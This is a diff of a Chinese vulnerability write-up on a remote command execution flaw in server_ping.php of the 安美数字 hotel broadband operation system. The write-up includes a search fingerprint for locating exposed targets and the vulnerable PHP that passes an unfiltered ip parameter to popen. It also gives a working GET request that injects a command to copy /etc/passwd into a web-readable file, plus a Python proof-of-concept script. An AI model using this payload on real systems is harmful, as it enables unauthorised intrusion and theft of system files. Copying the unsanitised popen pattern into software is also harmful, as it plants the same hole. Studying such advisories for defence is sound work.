@@ -1,34 +1,30 @@
-# 安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞
+# 安美数字 酒店宽带运营系统 server\_ping.php 远程命令执行漏洞
 
-# 漏洞描述
+## 安美数字 酒店宽带运营系统 server\_ping.php 远程命令执行漏洞
 
-安美数字 酒店宽带运营系统 server_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行
+## 漏洞描述
 
-## 漏洞影响
+安美数字 酒店宽带运营系统 server\_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行
+
+### 漏洞影响
 
 ```
 安美数字 酒店宽带运营系统
 ```
 
-## 网络测绘
+### 网络测绘
 
 ```
 "酒店宽带运营"
 ```
 
-## 漏洞复现
+### 漏洞复现
 
 登录页面如下
 
+![](../.gitbook/assets/202202101906343.png)
 
-
-![](images/202202101906343.png)
-
-
-
-存在漏洞的文件为 **server_ping.php**
-
-
+存在漏洞的文件为 **server\_ping.php**
 
 ```php
 <?
@@ -57,40 +53,26 @@ if (strstr($getString, "2 received, 0%")) {
 ?>
 ```
 
-
-
 漏洞位置为
 
-
-
-```plain
+```
 $cmd = "ping -c 2 -s 65 $ip";
 $fp = popen($cmd, "r");
 ```
 
-
-
 GET传入 **$ip参数** 后直接命令执行，并且文件无权限要求
-
-
 
 请求包为
 
-
-
-```plain
+```
 GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1 HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
 ```
 
+![](../.gitbook/assets/202202101907634.png)
 
-
-![](images/202202101907634.png)
-
-## 漏洞POC
-
-
+### 漏洞POC
 
 ```python
 #!/usr/bin/python3
@@ -150,6 +132,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-
-
-![](images/202202101907822.png)
+![](../.gitbook/assets/202202101907822.png)
